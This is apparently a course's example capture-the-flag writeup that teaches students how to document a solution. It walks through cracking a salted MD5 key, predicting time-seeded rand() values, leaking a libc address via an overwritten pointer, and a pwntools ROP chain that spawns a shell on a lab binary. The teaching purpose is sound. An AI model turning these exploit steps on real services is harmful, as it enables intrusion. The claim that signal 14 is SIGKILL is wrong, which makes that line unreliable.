
# Example Challenge

> Note: This writeup serves the purpose of providing you as a guideline on how you should write your writeups for this course in terms of length, detail and coherence.
> It is written as if the challenge is only remotely available, as it is the case for the other real challenges. You are provided with docker files that
> represent the environment that is also used remotely.
> 
> The notes in this writeup give you some general additional hints and ideas and are not limited to binary reversing challenges only.

## Introduction

The challenge can be accessed remotely using `nc <ip> <port>`. The files that are present in the remote environment can be downloaded for analysis and local exploit development.
The real exploit has to be executed against the remote environment, which contains a `flag.txt` that contains the flag.

There are multiple files present in the download:

1. `example_chal`
2. `libc-2.37.so`

`example_chal` appears to be the main binary file. A quick inspection reveals some information about it:

```
» file example_chal
example_chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter
/lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8c3734101518e5c9787d672c72e9cf1afcb7b41c, for GNU/Linux 3.2.0,
with debug_info, not stripped
```

```
» checksec example_chal
[*] 'example_chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

> Note: Markdown formatting helps the readability of the writeup. Consider using markdown for terminal output, code blocks, in-line commands and to highlight certain words and identifiers.

This means that the binary is compiled for the `amd64` architecture. The binary is not stripped and contains debug information, which means there are symbols present like function names.

What you can also see at first glance is that the compiler disabled some crucial security mechanisms. There are no stack canaries, which should make buffer overflows easier. 
The `NX` bit is set though, which indicates that regions like the stack are not executable. This generally prevents executing shellcode dropped on the stack. Furthermore, PIE is disabled. This means that the binary is always loaded at a fixed location `(0x400000)` and is not
randomized by ASLR. This is the case only for the binary itself, not for linked libraries like the libc, though. To see that this is true, you can run `ldd example_chal` multiple times and observe the address for libc changing.

```
» file libc-2.37.so
libc-2.37.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter
/lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bdb8aa3b1b60f9d43e1c70ba98158e05f765efdc, for GNU/Linux 3.2.0,
stripped
```

This file is what is says it is, namely the libc version that the challenge binary is linked against. This makes sense, because different versions of the libc might have different offsets for functions and symbols which is important when finding exploits.

> Note: It is always a good idea to give an overview of the files and the file structure of the given challenge. What can you observe right away before going more in-depth? Which files serve what purpose? What constraints are you faced with?

## Running the binary

When the binary is executed for the first time, it shows some welcome banner:

```
                                 _             _           _ _
                                | |           | |         | | |
   _____  ____ _ _ __ ___  _ __ | | ___    ___| |__   __ _| | | ___ _ __   __ _  ___
  / _ \ \/ / _` | '_ ` _ \| '_ \| |/ _ \  / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \
 |  __/>  < (_| | | | | | | |_) | |  __/ | (__| | | | (_| | | |  __/ | | | (_| |  __/
  \___/_/\_\__,_|_| |_| |_| .__/|_|\___|  \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|
                          | |                                              __/ |
                          |_|                                             |___/
Welcome! It's 2023-07-20 03:22:33, which means it's time to play a game! :)

First, enter the 9 digit key (i.e.: [0-9]{9}) to verify you are eligible to play:
>
```

Interestingly, the banner shows the current date and time. Maybe this comes in handy later on.
It appears the challenge is supposed to be some kind of game, and you are prompted to enter a 9 digit key in order to proceed.
When a random typed 9 digit number is entered, the following gets displayed:

```
> 123456789
Invalid key! Exiting...%
```

Other attempts like entering more or less than 9 digits as well as other characters doesn't seem to work, as you get the same output.

Also, if you leave the prompt open for too long, the executable terminates automatically after 10 seconds with the message `too slow!`:

```
First, enter the 9 digit key (i.e.: [0-9]{9}) to verify you are eligible to play:
>
Too slow!
```

Since this is all that can be done without further reverse engineering, it is time to open up IDA.

> Note: Showing what the application does when it is executed (i.e. what a normal user will see) is very important in order for a reader to understand how the application works on a high level. Just imagine someone
> is reading your writeup that has never seen or executed the application before.

When the binary is opened in IDA, you can see the `start` function. This is the entry point of the binary that gets called before the main function. The reference to the real main function can
be found as argument to `_libc_start_main`:

```c
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  char *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  _libc_start_main((int (__fastcall *)(int, char **, char **))main, v4, &retaddr, 0LL, 0LL, a3, &v5);
  __halt();
}
```

Inside the main function, you can see the mechanism that lets the executable automatically terminate after a certain amount of time:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signal(14, (__sighandler_t)sig_handler);
  alarm(0xAu);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  main_menu();
}
```

```c
void __fastcall __noreturn sig_handler(int signum)
{
  fwrite("\nToo slow!\n", 1uLL, 0xBuLL, stderr);
  exit(1);
}
```

> Note: If you are referring to source code, it is a good idea to show code snippets along with your explanation so the reader can understand what you are talking about.

A [`signal`](https://man7.org/linux/man-pages/man2/signal.2.html) handler is registered for the signal number 14, which corresponds to `SIGKILL`. The signal handler, `sig_handler`, only writes the `too slow!`
string to the terminal and then calls `exit(1)` to terminate after the [`alarm`](https://man7.org/linux/man-pages/man2/alarm.2.html) is triggered after 10 seconds.

The function `main_menu` that gets called at the end of `main` consists of the following:

```c
void __fastcall __noreturn main_menu()
{
  int user_input; // [rsp+Ch] [rbp-4h] BYREF

  print_banner();
  check_pw();
  user_input = 0;
  while ( 1 )
  {
    printf("\nSelect an option:\n 1. Show Highscore\n 2. Play game\n 3. Exit\n> ");
    if ( (unsigned int)__isoc99_scanf("%d", &user_input) != 1 )
    {
      printf("scanf error in main_menu");
      exit(1);
    }
    if ( user_input == 3 )
    {
      printf("It was fun playing with you. Goodbye!");
      exit(0);
    }
    if ( user_input > 3 )
      break;
    if ( user_input == 1 )
    {
      show_highscore();
    }
    else
    {
      if ( user_input != 2 )
        break;
      play_game();
    }
  }
  printf("Invalid button pressed. Exiting...");
  exit(0);
}
```

Since we do not arrive at the while loop yet, the serial key check must be before that. There is a function called `check_pw`, which sounds about right.

```c
void __fastcall check_pw()
{
  void *v0; // rsp
  unsigned __int8 md5_out[16]; // [rsp+8h] [rbp-60h] BYREF
  char (*p_buffer)[]; // [rsp+28h] [rbp-40h]
  __int64 v4; // [rsp+30h] [rbp-38h]

  printf("\n\nFirst, enter the 9 digit key (i.e.: [0-9]{9}) to verify you are eligible to play: \n> ");
  v4 = 37LL;
  v0 = alloca(48LL);
  p_buffer = (char (*)[])md5_out;
  memset(md5_out, 0, 0x26uLL);
  if ( !read_line((char *)p_buffer, 0x22uLL) )
  {
    fwrite("error", 1uLL, 5uLL, stderr);
    exit(1);
  }
  memcpy((char *)p_buffer + 9, PW_SALT, 2uLL);
  md5((const char *)p_buffer, md5_out);
  if ( memcmp(md5_out, PW_HASH, 0x10uLL) )
  {
    printf("Invalid key! Exiting...");
    exit(1);
  }
  puts("Key accepted!");
}
```

This function reads in 34 bytes into the buffer `p_buffer`, then uses `memcpy` to append two bytes `PW_SALT` at the end. `PW_SALT` consists of the bytes `0x34` and `0x32`:

```
.rodata:0000000000402031 PW_SALT         db 34h, 32h, 0
```

which corresponds to the string `42`. The buffer is then used as argument for the function `md5`, which calculates the `MD5` hash of the input + salt:

```c
void __fastcall md5(const char *input, unsigned __int8 *output)
{
  __int64 v2; // rax
  size_t v3; // rax
  unsigned int md_len; // [rsp+14h] [rbp-Ch] BYREF
  EVP_MD_CTX *mdctx; // [rsp+18h] [rbp-8h]

  mdctx = (EVP_MD_CTX *)EVP_MD_CTX_new();
  v2 = EVP_md5();
  EVP_DigestInit(mdctx, v2);
  v3 = strlen(input);
  EVP_DigestUpdate(mdctx, input, v3);
  EVP_DigestFinal_ex(mdctx, output, &md_len);
  EVP_MD_CTX_free(mdctx);
}
```

The output is then compared with `memcmp` against `PW_HASH`. If they are not equal, the message `Invalid key! Exiting...` is shown as seen earlier.
`PW_HASH` consists of the following bytes:

```
.rodata:0000000000402020 PW_HASH         db 0B1h, 18h, 44h, 50h, 0C0h, 48h, 0C5h, 0D9h, 10h, 36h
.rodata:0000000000402020                                         ; DATA XREF: check_pw+17D↑o
.rodata:000000000040202A                 db 0CFh, 88h, 10h, 59h, 6, 96h, 0
```

which is `b1184450c048c5d91036cf8810590696` in more readable form. So the goal is now to find out the correct input, so that, when the salt is appended, the
`MD5` hash equals to `b1184450c048c5d91036cf8810590696`.

Usually, you can try sites like https://crackstation.net/ for known hashes and their preimages, but in this case a salt is added. Salted hashes are
generally used to prevent the creation of such lookup tables (see https://crackstation.net/hashing-security.htm). In this case, this particular hash is not in their database.

`MD5` hashes are comparatively fast to compute, and the length and alphabet of the preimage is known (9 digits of 0-9), which makes brute-forcing a viable option.

> Note: Some background information about the thing you are talking about can give context to readers that are not familiar with the subject.

A quickly written python script solves this problem:

```python
import hashlib
import time

target = "b1184450c048c5d91036cf8810590696"
salt = "42"

start = time.time()
for i in range(10**9):
    i_str = str(i).zfill(9) + salt
    i_str = i_str.encode()
    result = hashlib.md5(i_str).hexdigest()
    if (result == target):
        print(f'{i_str} {result}')
        break
end = time.time()
print(end - start)
```

This takes about 4 minutes on my machine to finish:

```
b'31337133742' b1184450c048c5d91036cf8810590696
242.90721607208252
```

> Note: Don't just tell the reader what you did like "I wrote some script to solve this problem and then moved on", show what you did, show the script, and the output.

Another (quicker) approach would be to use `hashcat` (https://hashcat.net/hashcat/) which utilizes the GPU and CUDA to parallelize the brute force task.

```
❯ .\hashcat.exe -m 10 -a 3 -w 3 b1184450c048c5d91036cf8810590696:42 ?d?d?d?d?d?d?d?d?d

b1184450c048c5d91036cf8810590696:42:313371337

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10 (md5($pass.$salt))
Hash.Target......: b1184450c048c5d91036cf8810590696:42
Time.Started.....: Thu Jul 20 04:37:31 2023 (0 secs)
Time.Estimated...: Thu Jul 20 04:37:31 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?d?d?d?d?d?d?d?d?d [9]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7678.7 MH/s (1.78ms) @ Accel:512 Loops:500 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 940765000/1000000000 (94.08%)
Rejected.........: 0/940765000 (0.00%)
Restore.Point....: 935380/1000000 (93.54%)
Restore.Sub.#1...: Salt:0 Amplifier:0-500 Iteration:0-500
Candidate.Engine.: Device Generator
Candidates.#1....: 123471429 -> 685720517
Hardware.Mon.#1..: Temp: 54c Fan: 34% Util:100% Core:1995MHz Mem:7000MHz Bus:16

Started: Thu Jul 20 04:37:28 2023
Stopped: Thu Jul 20 04:37:33 2023
```

> Note: Alternative solutions to problems can be also very interesting and shows that you tried and considered multiple approaches.

This takes only 6 seconds. Either way, the correct preimage of the hash is `313371337`. This can be now tested using the challenge binary:

```
First, enter the 9 digit key (i.e.: [0-9]{9}) to verify you are eligible to play:
> 313371337
Key accepted!

Select an option:
 1. Show Highscore
 2. Play game
 3. Exit
>
```

Now we have access to the main menu. When key `1` is pressed, it shows the current high score:

```
> 1
Current highscore:
17       by      Gordon Freeman

Select an option:
 1. Show Highscore
 2. Play game
 3. Exit
>
```

When the key `2` is pressed, the game starts:

```
> 2
Alright, let's go!
 Which numbers am I thinking of?
>
```

With some random (and wrong) guess, it shows `Game over!`:

```
> 2
Alright, let's go!
 Which numbers am I thinking of?
> 5
Game over!

Select an option:
 1. Show Highscore
 2. Play game
 3. Exit
>
```

The logic for the game can be found in the function `play_game`, which is located in `main_menu`:

```c
void __fastcall play_game()
{
  int guess; // [rsp+4h] [rbp-Ch] BYREF
  int rnd_val; // [rsp+8h] [rbp-8h]
  int score; // [rsp+Ch] [rbp-4h]

  printf("Alright, let's go!\n Which numbers am I thinking of?\n> ");
  score = 0;
  while ( 1 )
  {
    rnd_val = rand() % 100 + 1;
    if ( (unsigned int)__isoc99_scanf("%d", &guess) != 1 )
    {
      printf("scanf error in play_game");
      exit(1);
    }
    if ( rnd_val != guess )
      break;
    ++score;
    printf("correct!\n> ");
  }
  puts("Game over!");
  if ( score >= highscore_val )
  {
    highscore_val = score;
    set_highscore_name();
  }
}
```

This function generates a random value using `rand` and maps that value to a range from 1 to 100. It then reads in a single value using `scanf` and compares the two values.
When they are equal (i.e. the guess is correct), the score counter increases and the loop begins anew. The game goes on as long as correct values are given. If the first wrong guess is encountered,
the game is over. If the achieved score is then higher than the previous high score, `set_highscore_name` is called. Let's look at this function a little bit closer:

> Note: Don't just show the code block, but also explain in detail what the function is doing. Maybe the reader is not quite familiar with C or IDA decompilation output.

```c
void __fastcall set_highscore_name()
{
  char buffer[264]; // [rsp+0h] [rbp-110h] BYREF
  int n; // [rsp+10Ch] [rbp-4h]

  printf("New highscore! Please enter your name:\n> ");
  highscore_name_ptr = highscore_name;
  n = read(0, buffer, 1024uLL);
  memcpy(highscore_name, buffer, n);
}
```

At first glance you can already see the vulnerability: the size of `buffer` is 264 bytes, and `read` writes to this buffer with 1024 bytes at maximum. This means when you win the game (i.e. beat the current high score), you can
enter a new name, which can overflow the buffer and the return address, which in turn enables exploit techniques like ROP. Before we try to understand what the exploit should do exactly, first we need to know how to be able to get into this function in the first place,
that means how do we guess the correct number 17 times (the current high score) consecutively.

> Note: Make sure the reader understands the following: What exactly is the vulnerability? Why can it be exploited? How can it be exploited?

So how is it possible to guess the correct values? One questions remains: if you look at the man page for `rand` (https://man7.org/linux/man-pages/man3/srand.3.html), it says: "The srand() function sets its argument as the seed for a new
sequence of pseudo-random integers to be returned by rand(). These sequences are repeatable by calling srand() with the same seed value." which sounds helpful.

> Note: Referencing external sources is always a good idea.

But where is `srand` called? If you search in IDA for Xrefs to the `srand` function, `print_banner` pops up. This function gets called at the very top of `main_menu` and is responsible for printing the banner (as the names suggests):

```
void __fastcall print_banner()
{
  char s[32]; // [rsp+0h] [rbp-30h] BYREF
  time_t timer; // [rsp+20h] [rbp-10h] BYREF
  tm *tp; // [rsp+28h] [rbp-8h]

  putchar(10);
  puts("                                 _             _           _ _                       ");
  puts("                                | |           | |         | | |                      ");
  puts("   _____  ____ _ _ __ ___  _ __ | | ___    ___| |__   __ _| | | ___ _ __   __ _  ___ ");
  puts("  / _ \\ \\/ / _` | '_ ` _ \\| '_ \\| |/ _ \\  / __| '_ \\ / _` | | |/ _ \\ '_ \\ / _` |/ _ \\");
  puts(" |  __/>  < (_| | | | | | | |_) | |  __/ | (__| | | | (_| | | |  __/ | | | (_| |  __/");
  puts("  \\___/_/\\_\\__,_|_| |_| |_| .__/|_|\\___|  \\___|_| |_|\\__,_|_|_|\\___|_| |_|\\__, |\\___|");
  puts("                          | |                                              __/ |     ");
  puts("                          |_|                                             |___/      ");
  memset(s, 0, sizeof(s));
  time(&timer);
  tp = localtime(&timer);
  strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);
  printf("Welcome! It's %s, which means it's time to play a game! :)", s);
  srand(timer);
}
```

One interesting thing can be observed here. Do you remember that the current date and time was written to the terminal when the binary is executed? This timestamp
is also used as seed for `srand`. Since the timestamp is printed to us, we also know the seed, which means we can proactively derive every random number that is generated with `rand` beforehand, and thus beat the game.

> Note: Very important, show your reasoning for your approaches. Why does this work what you are about to do?

Let's try this manually using a short python script and a specific timestamp from the terminal output:

```python
import subprocess
from datetime import datetime


def main():

    raw_timestamp = b'2023-07-20 05:23:44'
    timestamp = int((datetime.strptime(raw_timestamp.decode(), '%Y-%m-%d %H:%M:%S')).timestamp())

    # using the timestamp as seed, calculate a few random values for later
    rand_values = subprocess.check_output(
        ['./rand_nums', str(timestamp), str(20)]).decode().rstrip().split('\n')

    # map to 1-100, same as game does
    print([int(x) % 100 + 1 for x in rand_values])


if __name__ == '__main__':
    main()

```

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char** argv) {
    int seed = atoi(argv[1]);
    int count = atoi(argv[2]);
    srand(seed);
    for (int i = 0; i < count; ++i) {
        printf("%d\n", rand());
    }
}
```

The python script passes the timestamp and a count number to the listed C program, which uses `srand` and `rand` to generate the values. The output for the specific timestamp in the code is:

```
[84, 77, 65, 51, 35, 91, 27, 14, 94, 38, 69, 42, 13, 87, 54, 15, 88, 37, 11, 17]
```

You can then test the values in the actual game:

```
> 2
Alright, let's go!
 Which numbers am I thinking of?
> 84
correct!
> 77
correct!
> 65
correct!
(...)
```

However, since the execution terminates after 10 seconds, you have to either automate this or patch the binary to disable the timer in order to test this by hand.

Now that we know how the beat the high score and enter the `set_highscore_name` function that contains the buffer overflow vulnerability, let's see what we can do there.

Looking at the function again:

```c
void __fastcall set_highscore_name()
{
  char buffer[264]; // [rsp+0h] [rbp-110h] BYREF
  int n; // [rsp+10Ch] [rbp-4h]

  printf("New highscore! Please enter your name:\n> ");
  highscore_name_ptr = highscore_name;
  n = read(0, buffer, 1024uLL);
  memcpy(highscore_name, buffer, n);
}
```

You can see that not only the `buffer` is filled, but there is also a `memcpy` that copies the content of `buffer` to `highscore_name`. Also, `highscore_name_ptr` is set to
`highscore_name`. When you look at the memory region of these symbols, you can see that they are adjacent in memory:

```
data:0000000000404100 highscore_name  db 47h, 6Fh, 72h, 64h, 6Fh, 6Eh, 20h, 46h, 72h, 2 dup(65h)
.data:0000000000404100                                         ; DATA XREF: set_highscore_name+23↑o
.data:0000000000404100                                         ; set_highscore_name+5D↑o ...
.data:000000000040410B                 db 6Dh, 61h, 6Eh, 12h dup(0)
.data:0000000000404120 ; int highscore_val
.data:0000000000404120 highscore_val   dd 11h                  ; DATA XREF: show_highscore+F↑r
.data:0000000000404120                                         ; play_game+C3↑r ...
.data:0000000000404124                 align 8
.data:0000000000404128 ; char *highscore_name_ptr
.data:0000000000404128 highscore_name_ptr dq offset highscore_name
.data:0000000000404128                                         ; DATA XREF: show_highscore+8↑r
.data:0000000000404128                                         ; set_highscore_name+2A↑w
.data:0000000000404128 _data           ends
.data:0000000000404128
```

The distance in memory from `highscore_name` to `highscore_name_ptr` is 40 bytes. Inbetween, `highscore_val` is located. Since the stack buffer in `set_highscore_name` is much larger with 264 bytes,
it is possible to override `highscore_val` and `highscore_name_ptr` when a name is entered that is at least 48 bytes long, but without overflowing the stack buffer. Why is that of use?

If you look at `show_highscore` (the function that is called when you press `1` in the main menu), you can see that it reads from `highscore_name_ptr` and prints it to the terminal:

```
void __fastcall show_highscore()
{
  printf("Current highscore:\n%d\t by \t %s\n", (unsigned int)highscore_val, highscore_name_ptr);
}
```

It will print whatever data this pointer points to, so when you override this pointer with the help of `set_highscore_name` you can make it point to something useful and thus leak some important information.

Since we discovered that `set_highscore_name` also contains a buffer overflow, it can be used for ROP, for example calling `/bin/sh`. But in order to do that, the libc address in memory must be known.
We remember that the binary is compiled without PIE, so it is always at a fixed location, however the libc will be mapped at a random base address.

To leak the libc address, we can override `highscore_name_ptr` with the address of a GOT entry, for example the entry of `printf`, which points directly into libc. When we know the
address of `printf` in libc, we can easily calculate the base address and thus any other function offset. To sum up, this is the strategy:

1. Play the game and beat the current high score of 17
2. Enter a new name that is 48 bytes long that overrides `highscore_name_ptr` with the address of the `printf` GOT entry
3. Select "Show highscore" in the main menu to leak the libc address of `printf`
4. Generate a ROP chain using that information that calls `/bin/sh`
5. Play the game again to enter another name
6. This time, overflow the buffer including the return address to drop the ROP chain
7. The ROP chain executes `/bin/sh` and uses `cat` to print the content of `flag.txt`
8. ???
9. Profit

> Note: Such a summary can help to understand the "big picture"

Now that we know what to do we can develop the exploit script step by step. Only the important parts are shown here, the full exploit can be found in
`exploit.py`.

Of course, we will use pwntools for this task. First, connect to the remote environment:

```python
p = connect('localhost', 31337)
```

We need the timestamp for the random seed, so we just grab it and calculate the random values like we did before:

```python
p.recvuntil(b'Welcome! It\'s ')
raw_timestamp = p.recvuntil(b',')[:-1]
timestamp = int((datetime.strptime(raw_timestamp.decode(), '%Y-%m-%d %H:%M:%S')).timestamp())

rand_values = subprocess.check_output(
    ['./rand_nums', str(timestamp), str(20)]).decode().rstrip().split('\n')

rand_values = [int(x) % 100 + 1 for x in rand_values]
```

Now we got the correct random values to play the game. But first, we need to log in:

```python
p.sendline(b'313371337')
```

We now want to play the game:

```python
p.sendline(b'2')
```

We now send our 20 pre-calculated guesses to beat the high score, followed by a single wrong guess so the game is over:

```python
for val in rand_values:
    p.sendline(str(val).encode())
p.sendline(b'0')
```

Now we need the address of `printf` in the GOT: 

```python
binary = ELF('../src/example_chal')
printf_addr = binary.got['printf']
```

We then construct the payload. It contains 40 `\x00` characters for padding, which also overrides the high score value to
0, so it is easy to win again when we play a second time.

```python
payload = b'\x00' * 40
payload += p64(printf_addr)
p.sendline(payload)
```

At this point, `highscore_name_ptr` points to the `printf` entry and the `highscore_val` is set to 0. We now show the high score:

```python
p.sendline(b'1')
```

We then extract the bytes that correspond to `highscore_name_ptr` from the output:

```python
printf_addr = u64(p.recv(6) + b'\x00\x00')
```

We can now calculate the libc base address:

```python
libc = ELF('../config/libc-2.37.so')
libc.address = printf_addr - libc.symbols['printf']
```

Building the ROP chain which calls `/bin/sh`:

```python
context.clear(arch='amd64')
rop_chain = ROP([libc])
rop_chain.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)
```

To send the ROP chain, we have to play the game again. But it is easy this time as we beat the high score with 0 score:

```python
p.sendline(b'2')
p.sendline(b'0')
```

We are now in `set_highscore_name` again and can send the next payload:

```python
p.sendline(b'A' * 280 + rop_chain.chain())
```

The padding to the return address on the stack is `280`, which can be either found statically using IDA or dynamically using `cyclic`.
At this point, `/bin/sh` is being executed:

```python
p.sendline(b'cat /home/example/flag.txt')
```

This prints us the content of `flag.txt`. The flag is `FLG_{not_the_real_flag}`.

> Note: The most important take away points are:
> + Imagine the reader has never seen or touched the binary, but with your writeup in hand, the reader should be able to easily understand and reproduce the exploit
> you are presenting.
> + Make sure you explain everything you are doing and your reasoning. Explain WHY things are working the way they are. Better to over-explain than to under-explain.
> + Make sure the formatting is clean, and you are using proper Markdown.